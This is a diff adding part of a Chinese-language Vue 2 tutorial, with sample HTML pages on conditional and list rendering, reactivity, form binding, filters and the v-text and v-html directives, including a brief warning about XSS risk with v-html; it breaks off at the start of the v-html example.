+<p><img alt="image-20221202200525287" src="../assets/image-20221202200525287.png" /></p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot;&gt;
+   &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+   &lt;title&gt;条件渲染&lt;/title&gt;
+   &lt;script src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      &lt;!-- 使用v-show做条件渲染 --&gt;
+      &lt;!-- &lt;h2 v-show=&quot;false&quot;&gt;欢迎来到{{name}}&lt;/h2&gt; --&gt;
+      &lt;!-- &lt;h2 v-show=&quot;1 === 1&quot;&gt;欢迎来到{{name}}&lt;/h2&gt; --&gt;
+
+      &lt;!-- 使用v-if做条件渲染 --&gt;
+      &lt;!-- &lt;h2 v-if=&quot;false&quot;&gt;欢迎来到{{name}}&lt;/h2&gt; --&gt;
+      &lt;!-- &lt;h2 v-if=&quot;1 === 1&quot;&gt;欢迎来到{{name}}&lt;/h2&gt; --&gt;
+
+      &lt;h2&gt;当前的n值是：{{n}}&lt;/h2&gt;
+      &lt;button @click=&quot;n++&quot;&gt;点我n++&lt;/button&gt;
+
+      &lt;!-- v-else和v-else-if --&gt;
+      &lt;!-- &lt;div v-if=&quot;n == 1&quot;&gt;123&lt;/div&gt;
+      &lt;div v-else-if=&quot;n == 2&quot;&gt;456&lt;/div&gt;
+      &lt;div v-else&gt;789&lt;/div&gt; --&gt;
+
+      &lt;!-- template与v-if配合使用 --&gt;
+      &lt;template v-if=&quot;n == 1&quot;&gt;
+         &lt;h2&gt;你好&lt;/h2&gt;
+         &lt;h2&gt;xgzx&lt;/h2&gt;
+      &lt;/template&gt;
+   &lt;/div&gt;
+
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      Vue.config.devtools = true;
+      Vue.config.productionTip = false;
+
+      new Vue({
+         el: '#root',
+         data: {
+            name: 'xgzx',
+            n: 0
+         }
+      })
+   &lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h1 id="_9">十二、列表渲染</h1>
+<h2 id="121">12.1 基本列表</h2>
+<p><img alt="image-20221202203614465" src="../assets/image-20221202203614465.png" /></p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot;&gt;
+   &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+   &lt;script src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+   &lt;title&gt;基本列表&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      &lt;!-- 遍历数组 --&gt;
+      &lt;h2&gt;人员列表&lt;/h2&gt;
+      &lt;ul&gt;
+         &lt;li v-for=&quot;(p, index) in personList&quot; :key=&quot;index&quot;&gt;
+            {{p.name}}-{{p.age}}
+         &lt;/li&gt;
+      &lt;/ul&gt;
+
+      &lt;!-- 遍历对象 --&gt;
+      &lt;h2&gt;汽车信息&lt;/h2&gt;
+      &lt;ul&gt;
+         &lt;li v-for=&quot;(val, k) in car&quot; :key=&quot;k&quot;&gt;
+            {{k}}---{{val}}
+         &lt;/li&gt;
+      &lt;/ul&gt;
+
+      &lt;!-- 遍历字符串 --&gt;
+      &lt;h2&gt;测试遍历字符串（用得少）&lt;/h2&gt;
+      &lt;ul&gt;
+         &lt;li v-for=&quot;(char, index) in str&quot; :key=&quot;index&quot;&gt;
+            {{char}}---{{index}}
+         &lt;/li&gt;
+      &lt;/ul&gt;
+
+      &lt;!-- 遍历指定次数 --&gt;
+      &lt;h2&gt;测试遍历指定次数（用得少）&lt;/h2&gt;
+      &lt;ul&gt;
+         &lt;li v-for=&quot;(num, index) in 10&quot; :key=&quot;index&quot;&gt;
+            {{num}}---{{index}}
+         &lt;/li&gt;
+      &lt;/ul&gt;
+   &lt;/div&gt;
+
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      Vue.config.devtools = true;
+      Vue.config.productionTip = false;
+
+      new Vue({
+         el: '#root',
+         data: {
+            personList: [
+               { id: '001', name: '张三', age: 18 },
+               { id: '002', name: '李四', age: 20 },
+               { id: '003', name: '王五', age: 30 }
+            ],
+            car: {
+               name: '奥迪A8',
+               price: '70w',
+               color: 'black'
+            },
+            str:'hello'
+         }
+      })
+   &lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h2 id="122-key">12.2 key的原理</h2>
+<p><img alt="image-20221202210151121" src="../assets/image-20221202210151121.png" /></p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot;&gt;
+   &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+   &lt;script src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+   &lt;title&gt;key的原理&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      &lt;!-- 遍历数组 --&gt;
+      &lt;h2&gt;人员列表&lt;/h2&gt;
+      &lt;button @click=&quot;add&quot;&gt;添加一个人&lt;/button&gt;
+      &lt;ul&gt;
+         &lt;li v-for=&quot;(p, index) in personList&quot; :key=&quot;p.id&quot;&gt;
+            {{p.name}}-{{p.age}}
+            &lt;input type=&quot;text&quot;&gt;
+         &lt;/li&gt;
+      &lt;/ul&gt;
+   &lt;/div&gt;
+
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      Vue.config.devtools = true;
+      Vue.config.productionTip = false;
+
+      new Vue({
+         el: '#root',
+         data: {
+            personList: [
+               { id: '001', name: '张三', age: 18 },
+               { id: '002', name: '李四', age: 20 },
+               { id: '003', name: '王五', age: 30 }
+            ],
+         },
+         methods: {
+            add(){
+               const p = {id:'004', name:'老刘', age:50}
+               this.personList.unshift(p)
+            }
+         },
+      })
+   &lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h2 id="123">12.3 列表过滤</h2>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot;&gt;
+   &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+   &lt;script src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+   &lt;title&gt;列表过滤&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      &lt;!-- 遍历数组 --&gt;
+      &lt;h2&gt;人员列表&lt;/h2&gt;
+      &lt;input type=&quot;text&quot; placeholder=&quot;请输入名字&quot; v-model=&quot;keyword&quot;&gt;
+      &lt;ul&gt;
+         &lt;li v-for=&quot;(p, index) in filPersonList&quot; :key=&quot;p.id&quot;&gt;
+            {{p.name}}-{{p.age}}--{{p.sex}}
+         &lt;/li&gt;
+      &lt;/ul&gt;
+   &lt;/div&gt;
+
+
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      Vue.config.devtools = true;
+      Vue.config.productionTip = false;
+
+      // 用watch实现
+     /*  new Vue({
+         el: '#root',
+         data: {
+            keyword: '',
+            personList: [
+               { id: '001', name: '马冬梅', age: 18, sex: '女' },
+               { id: '002', name: '周冬雨', age: 20, sex: '女' },
+               { id: '003', name: '周杰伦', age: 30, sex: '男' },
+               { id: '004', name: '温杰伦', age: 30, sex: '男' }
+            ],
+            filPersonList: []
+         },
+         watch: {
+            keyword: {
+               immediate: true,
+               handler(val) {
+                  this.filPersonList = this.personList.filter((p) =&gt; {
+                     return p.name.indexOf(val) != -1
+                  })
+               }
+            }
+         }
+      }) */
+
+      // 用computed实现
+      new Vue({
+         el: '#root',
+         data: {
+            keyword: '',
+            personList: [
+               { id: '001', name: '马冬梅', age: 18, sex: '女' },
+               { id: '002', name: '周冬雨', age: 20, sex: '女' },
+               { id: '003', name: '周杰伦', age: 30, sex: '男' },
+               { id: '004', name: '温杰伦', age: 30, sex: '男' }
+            ],
+         },
+         computed: {
+            filPersonList() {
+               return this.personList.filter((p) =&gt; {
+                  return p.name.indexOf(this.keyword) != -1
+               })
+            }
+         }
+      })
+   &lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h2 id="124">12.4 列表排序</h2>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot;&gt;
+   &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+   &lt;script src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+   &lt;title&gt;列表排序&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      &lt;!-- 遍历数组 --&gt;
+      &lt;h2&gt;人员列表&lt;/h2&gt;
+      &lt;input type=&quot;text&quot; placeholder=&quot;请输入名字&quot; v-model=&quot;keyword&quot;&gt;
+      &lt;button @click=&quot;sortType = 2&quot;&gt;年龄升序&lt;/button&gt;
+      &lt;button @click=&quot;sortType = 1&quot;&gt;年龄降序&lt;/button&gt;
+      &lt;button @click=&quot;sortType = 0&quot;&gt;原顺序&lt;/button&gt;
+      &lt;ul&gt;
+         &lt;li v-for=&quot;(p, index) in filPersonList&quot; :key=&quot;p.id&quot;&gt;
+            {{p.name}}-{{p.age}}--{{p.sex}}
+         &lt;/li&gt;
+      &lt;/ul&gt;
+   &lt;/div&gt;
+
+
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      Vue.config.devtools = true;
+      Vue.config.productionTip = false;
+
+      // 用computed实现
+      new Vue({
+         el: '#root',
+         data: {
+            keyword: '',
+            sortType: 0,   //0原顺序，1降序，2升序
+            personList: [
+               { id: '001', name: '马冬梅', age: 18, sex: '女' },
+               { id: '002', name: '周冬雨', age: 20, sex: '女' },
+               { id: '003', name: '周杰伦', age: 30, sex: '男' },
+               { id: '004', name: '温杰伦', age: 17, sex: '男' }
+            ],
+         },
+         computed: {
+            filPersonList() {
+               const arr = this.personList.filter((p) =&gt; {
+                  return p.name.indexOf(this.keyword) != -1
+               })
+               // 判断下是否需要排序
+               if (this.sortType) {
+                  arr.sort((p1, p2) =&gt; {
+                     return this.sortType == 1 ? p2.age - p1.age : p1.age - p2.age;
+                  })
+               }
+               return arr;
+            }
+         }
+      })
+   &lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h2 id="125">12.5 更新时的一个问题</h2>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot;&gt;
+   &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+   &lt;script src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+   &lt;title&gt;更新时的一个问题&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      &lt;!-- 遍历数组 --&gt;
+      &lt;h2&gt;人员列表&lt;/h2&gt;
+      &lt;button @click=&quot;updateMei&quot;&gt;点我修改马冬梅的信息&lt;/button&gt;
+      &lt;ul&gt;
+         &lt;li v-for=&quot;(p, index) in personList&quot; :key=&quot;p.id&quot;&gt;
+            {{p.name}}-{{p.age}}--{{p.sex}}
+         &lt;/li&gt;
+      &lt;/ul&gt;
+   &lt;/div&gt;
+
+
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      Vue.config.devtools = true;
+      Vue.config.productionTip = false;
+
+      // 用computed实现
+      new Vue({
+         el: '#root',
+         data: {
+            personList: [
+               { id: '001', name: '马冬梅', age: 18, sex: '女' },
+               { id: '002', name: '周冬雨', age: 20, sex: '女' },
+               { id: '003', name: '周杰伦', age: 30, sex: '男' },
+               { id: '004', name: '温杰伦', age: 17, sex: '男' }
+            ],
+         },
+         methods: {
+            updateMei() {
+               // this.personList[0] = { id: '001', name: '马老师', age: 20, sex: '男' }  //不奏效
+               this.personList.splice(0, 1, { id: '001', name: '马老师', age: 20, sex: '男' })
+            }
+         },
+      })
+   &lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h2 id="126-vueset">12.6 Vue.set的使用</h2>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot; /&gt;
+   &lt;title&gt;Vue.set的使用&lt;/title&gt;
+   &lt;!-- 引入Vue --&gt;
+   &lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;!-- 准备好一个容器--&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      &lt;h1&gt;学校信息&lt;/h1&gt;
+      &lt;h2&gt;学校名称：{{school.name}}&lt;/h2&gt;
+      &lt;h2&gt;学校地址：{{school.address}}&lt;/h2&gt;
+      &lt;h2&gt;校长是：{{school.leader}}&lt;/h2&gt;
+      &lt;hr /&gt;
+      &lt;h1&gt;学生信息&lt;/h1&gt;
+      &lt;button @click=&quot;addSex&quot;&gt;添加一个性别属性，默认值是男&lt;/button&gt;
+      &lt;h2&gt;姓名：{{student.name}}&lt;/h2&gt;
+      &lt;h2 v-if=&quot;student.sex&quot;&gt;性别：{{student.sex}}&lt;/h2&gt;
+      &lt;h2&gt;年龄：真实{{student.age.rAge}}，对外{{student.age.sAge}}&lt;/h2&gt;
+      &lt;h2&gt;朋友们&lt;/h2&gt;
+      &lt;ul&gt;
+         &lt;li v-for=&quot;(f,index) in student.friends&quot; :key=&quot;index&quot;&gt;
+            {{f.name}}--{{f.age}}
+         &lt;/li&gt;
+      &lt;/ul&gt;
+   &lt;/div&gt;
+&lt;/body&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+
+   const vm = new Vue({
+      el: '#root',
+      data: {
+         school: {
+            name: '尚硅谷',
+            address: '北京',
+         },
+         student: {
+            name: 'tom',
+            age: {
+               rAge: 40,
+               sAge: 29,
+            },
+            friends: [
+               { name: 'jerry', age: 35 },
+               { name: 'tony', age: 36 }
+            ]
+         }
+      },
+      methods: {
+         addSex() {
+            // Vue.set(this.student,'sex','男')
+            this.$set(this.student, 'sex', '男')
+         }
+      }
+   })
+&lt;/script&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h2 id="127-vue_">12.7 Vue监测数据改变的原理_数组</h2>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot; /&gt;
+   &lt;title&gt;Vue监测数据改变的原理_数组&lt;/title&gt;
+   &lt;!-- 引入Vue --&gt;
+   &lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;!-- 准备好一个容器--&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      &lt;h1&gt;学校信息&lt;/h1&gt;
+      &lt;h2&gt;学校名称：{{school.name}}&lt;/h2&gt;
+      &lt;h2&gt;学校地址：{{school.address}}&lt;/h2&gt;
+      &lt;h2&gt;校长是：{{school.leader}}&lt;/h2&gt;
+      &lt;hr /&gt;
+      &lt;h1&gt;学生信息&lt;/h1&gt;
+      &lt;button @click=&quot;addSex&quot;&gt;添加一个性别属性，默认值是男&lt;/button&gt;
+      &lt;h2&gt;姓名：{{student.name}}&lt;/h2&gt;
+      &lt;h2 v-if=&quot;student.sex&quot;&gt;性别：{{student.sex}}&lt;/h2&gt;
+      &lt;h2&gt;年龄：真实{{student.age.rAge}}，对外{{student.age.sAge}}&lt;/h2&gt;
+      &lt;h2&gt;爱好&lt;/h2&gt;
+      &lt;ul&gt;
+         &lt;li v-for=&quot;(h,index) in student.hobby&quot; :key=&quot;index&quot;&gt;
+            {{h}}
+         &lt;/li&gt;
+      &lt;/ul&gt;
+      &lt;h2&gt;朋友们&lt;/h2&gt;
+      &lt;ul&gt;
+         &lt;li v-for=&quot;(f,index) in student.friends&quot; :key=&quot;index&quot;&gt;
+            {{f.name}}--{{f.age}}
+         &lt;/li&gt;
+      &lt;/ul&gt;
+   &lt;/div&gt;
+&lt;/body&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+
+   const vm = new Vue({
+      el: '#root',
+      data: {
+         school: {
+            name: '尚硅谷',
+            address: '北京',
+         },
+         student: {
+            name: 'tom',
+            age: {
+               rAge: 40,
+               sAge: 29,
+            },
+            hobby: ['抽烟', '喝酒', '烫头'],
+            friends: [
+               { name: 'jerry', age: 35 },
+               { name: 'tony', age: 36 }
+            ]
+         }
+      },
+      methods: {
+         addSex() {
+            // Vue.set(this.student,'sex','男')
+            this.$set(this.student, 'sex', '男')
+         }
+      }
+   })
+&lt;/script&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h2 id="128">12.8 总结数据监视</h2>
+<p><img alt="image-20221203115045968" src="../assets/image-20221203115045968.png" /></p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot; /&gt;
+   &lt;title&gt;总结数据监视&lt;/title&gt;
+   &lt;style&gt;
+      button {
+         margin-top: 10px;
+      }
+   &lt;/style&gt;
+   &lt;!-- 引入Vue --&gt;
+   &lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      &lt;h1&gt;学生信息&lt;/h1&gt;
+      &lt;button @click=&quot;student.age++&quot;&gt;年龄+1岁&lt;/button&gt; &lt;br /&gt;
+      &lt;button @click=&quot;addSex&quot;&gt;添加性别属性，默认值：男&lt;/button&gt; &lt;br /&gt;
+      &lt;button @click=&quot;student.sex = '未知' &quot;&gt;修改性别&lt;/button&gt; &lt;br /&gt;
+      &lt;button @click=&quot;addFriend&quot;&gt;在列表首位添加一个朋友&lt;/button&gt; &lt;br /&gt;
+      &lt;button @click=&quot;updateFirstFriendName&quot;&gt;修改第一个朋友的名字为：张三&lt;/button&gt; &lt;br /&gt;
+      &lt;button @click=&quot;addHobby&quot;&gt;添加一个爱好&lt;/button&gt; &lt;br /&gt;
+      &lt;button @click=&quot;updateHobby&quot;&gt;修改第一个爱好为：开车&lt;/button&gt; &lt;br /&gt;
+      &lt;button @click=&quot;removeSmoke&quot;&gt;过滤掉爱好中的抽烟&lt;/button&gt; &lt;br /&gt;
+      &lt;h3&gt;姓名：{{student.name}}&lt;/h3&gt;
+      &lt;h3&gt;年龄：{{student.age}}&lt;/h3&gt;
+      &lt;h3 v-if=&quot;student.sex&quot;&gt;性别：{{student.sex}}&lt;/h3&gt;
+      &lt;h3&gt;爱好：&lt;/h3&gt;
+      &lt;ul&gt;
+         &lt;li v-for=&quot;(h,index) in student.hobby&quot; :key=&quot;index&quot;&gt;
+            {{h}}
+         &lt;/li&gt;
+      &lt;/ul&gt;
+      &lt;h3&gt;朋友们：&lt;/h3&gt;
+      &lt;ul&gt;
+         &lt;li v-for=&quot;(f,index) in student.friends&quot; :key=&quot;index&quot;&gt;
+            {{f.name}}--{{f.age}}
+         &lt;/li&gt;
+      &lt;/ul&gt;
+   &lt;/div&gt;
+&lt;/body&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+
+   const vm = new Vue({
+      el: '#root',
+      data: {
+         student: {
+            name: 'tom',
+            age: 18,
+            hobby: ['抽烟', '喝酒', '烫头'],
+            friends: [
+               { name: 'jerry', age: 35 },
+               { name: 'tony', age: 36 }
+            ]
+         }
+      },
+      methods: {
+         addSex() {
+            // Vue.set(this.student,'sex','男')
+            this.$set(this.student, 'sex', '男')
+         },
+         addFriend() {
+            this.student.friends.unshift({ name: 'jack', age: 70 })
+         },
+         updateFirstFriendName() {
+            this.student.friends[0].name = '张三'
+         },
+         addHobby() {
+            this.student.hobby.push('学习')
+         },
+         updateHobby() {
+            // this.student.hobby.splice(0,1,'开车')
+            // Vue.set(this.student.hobby,0,'开车')
+            this.$set(this.student.hobby, 0, '开车')
+         },
+         removeSmoke() {
+            this.student.hobby = this.student.hobby.filter((h) =&gt; {
+               return h !== '抽烟'
+            })
+         }
+      }
+   })
+&lt;/script&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h1 id="_10">十三、收集表单数据</h1>
+<p><img alt="image-20221203122418298" src="../assets/image-20221203122418298.png" /></p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot; /&gt;
+   &lt;title&gt;收集表单数据&lt;/title&gt;
+   &lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      &lt;form @submit.prevent=&quot;demo&quot;&gt;
+         账号：&lt;input type=&quot;text&quot; v-model.trim=&quot;userInfo.account&quot;&gt; &lt;br /&gt;&lt;br /&gt;
+         密码：&lt;input type=&quot;password&quot; v-model=&quot;userInfo.password&quot;&gt; &lt;br /&gt;&lt;br /&gt;
+         年龄：&lt;input type=&quot;number&quot; v-model.number=&quot;userInfo.age&quot;&gt; &lt;br /&gt;&lt;br /&gt;
+         性别：
+         男&lt;input type=&quot;radio&quot; name=&quot;sex&quot; v-model=&quot;userInfo.sex&quot; value=&quot;male&quot;&gt;
+         女&lt;input type=&quot;radio&quot; name=&quot;sex&quot; v-model=&quot;userInfo.sex&quot; value=&quot;female&quot;&gt; &lt;br /&gt;&lt;br /&gt;
+         爱好：
+         学习&lt;input type=&quot;checkbox&quot; v-model=&quot;userInfo.hobby&quot; value=&quot;study&quot;&gt;
+         打游戏&lt;input type=&quot;checkbox&quot; v-model=&quot;userInfo.hobby&quot; value=&quot;game&quot;&gt;
+         吃饭&lt;input type=&quot;checkbox&quot; v-model=&quot;userInfo.hobby&quot; value=&quot;eat&quot;&gt;
+         &lt;br /&gt;&lt;br /&gt;
+         所属校区
+         &lt;select v-model=&quot;userInfo.city&quot;&gt;
+            &lt;option value=&quot;&quot;&gt;请选择校区&lt;/option&gt;
+            &lt;option value=&quot;beijing&quot;&gt;北京&lt;/option&gt;
+            &lt;option value=&quot;shanghai&quot;&gt;上海&lt;/option&gt;
+            &lt;option value=&quot;shenzhen&quot;&gt;深圳&lt;/option&gt;
+            &lt;option value=&quot;wuhan&quot;&gt;武汉&lt;/option&gt;
+         &lt;/select&gt;
+         &lt;br /&gt;&lt;br /&gt;
+         其他信息：
+         &lt;textarea v-model.lazy=&quot;userInfo.other&quot;&gt;&lt;/textarea&gt; &lt;br /&gt;&lt;br /&gt;
+         &lt;input type=&quot;checkbox&quot; v-model=&quot;userInfo.agree&quot;&gt;阅读并接受&lt;a href=&quot;http://www.atguigu.com&quot;&gt;《用户协议》&lt;/a&gt;
+         &lt;button&gt;提交&lt;/button&gt;
+      &lt;/form&gt;
+   &lt;/div&gt;
+&lt;/body&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+   Vue.config.productionTip = false
+
+   new Vue({
+      el: '#root',
+      data: {
+         userInfo: {
+            account: '',
+            password: '',
+            age: 18,
+            sex: 'female',
+            hobby: [],
+            city: 'beijing',
+            other: '',
+            agree: ''
+         }
+      },
+      methods: {
+         demo() {
+            console.log(JSON.stringify(this.userInfo))
+         }
+      }
+   })
+&lt;/script&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h1 id="_11">十四、过滤器</h1>
+<p><img alt="image-20221203134713813" src="../assets/image-20221203134713813.png" /></p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;meta charset=&quot;UTF-8&quot; /&gt;
+        &lt;title&gt;过滤器&lt;/title&gt;
+        &lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+        &lt;script type=&quot;text/javascript&quot; src=&quot;../js/dayjs.min.js&quot;&gt;&lt;/script&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;div id=&quot;root&quot;&gt;
+            &lt;h2&gt;显示格式化后的时间&lt;/h2&gt;
+            &lt;!-- 计算属性实现 --&gt;
+            &lt;h3&gt;现在是：{{fmtTime}}&lt;/h3&gt;
+            &lt;!-- methods实现 --&gt;
+            &lt;h3&gt;现在是：{{getFmtTime()}}&lt;/h3&gt;
+            &lt;!-- 过滤器实现 --&gt;
+            &lt;h3&gt;现在是：{{time | timeFormater}}&lt;/h3&gt;
+            &lt;!-- 过滤器实现（传参） --&gt;
+            &lt;h3&gt;现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}&lt;/h3&gt;
+            &lt;h3 :x=&quot;msg | mySlice&quot;&gt;尚硅谷&lt;/h3&gt;
+        &lt;/div&gt;
+
+        &lt;div id=&quot;root2&quot;&gt;
+            &lt;h2&gt;{{msg | mySlice}}&lt;/h2&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+
+    &lt;script type=&quot;text/javascript&quot;&gt;
+        Vue.config.productionTip = false
+        //全局过滤器
+        Vue.filter('mySlice',function(value){
+            return value.slice(0,4)
+        })
+
+        new Vue({
+            el:'#root',
+            data:{
+                time:1621561377603, //时间戳
+                msg:'你好，尚硅谷'
+            },
+            computed: {
+                fmtTime(){
+                    return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
+                }
+            },
+            methods: {
+                getFmtTime(){
+                    return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
+                }
+            },
+            //局部过滤器
+            filters:{
+                timeFormater(value,str='YYYY年MM月DD日 HH:mm:ss'){
+                    // console.log('@',value)
+                    return dayjs(value).format(str)
+                }
+            }
+        })
+
+        new Vue({
+            el:'#root2',
+            data:{
+                msg:'hello,atguigu!'
+            }
+        })
+    &lt;/script&gt;
+&lt;/html&gt;
+</code></pre>
+<h1 id="_12">十五、内置指令</h1>
+<h2 id="151-v-text">15.1 v-text指令</h2>
+<pre><code>我们学过的指令：
+        v-bind  : 单向绑定解析表达式, 可简写为 :xxx
+        v-model : 双向数据绑定
+        v-for   : 遍历数组/对象/字符串
+        v-on    : 绑定事件监听, 可简写为@
+        v-if        : 条件渲染（动态控制节点是否存存在）
+        v-else  : 条件渲染（动态控制节点是否存存在）
+        v-show  : 条件渲染 (动态控制节点是否展示)
+v-text指令：
+        1.作用：向其所在的节点中渲染文本内容。
+        2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。
+</code></pre>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;meta charset=&quot;UTF-8&quot; /&gt;
+        &lt;title&gt;v-text指令&lt;/title&gt;
+        &lt;!-- 引入Vue --&gt;
+        &lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;div id=&quot;root&quot;&gt;
+            &lt;div&gt;你好，{{name}}&lt;/div&gt;
+            &lt;div v-text=&quot;name&quot;&gt;&lt;/div&gt;
+            &lt;div v-text=&quot;str&quot;&gt;&lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+
+    &lt;script type=&quot;text/javascript&quot;&gt;
+        Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+
+        new Vue({
+            el:'#root',
+            data:{
+                name:'尚硅谷',
+                str:'&lt;h3&gt;你好啊！&lt;/h3&gt;'
+            }
+        })
+    &lt;/script&gt;
+&lt;/html&gt;
+</code></pre>
+<h2 id="152-v-html">15.2 v-html指令</h2>
+<pre><code>v-html指令：
+   1.作用：向指定节点中渲染包含html结构的内容。
+   2.与插值语法的区别：
+      (1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
+      (2).v-html可以识别html结构。
+   3.严重注意：v-html有安全性问题！！！！
+      (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
+      (2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
+</code></pre>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;meta charset=&quot;UTF-8&quot; /&gt;
+        &lt;title&gt;v-html指令&lt;/title&gt;
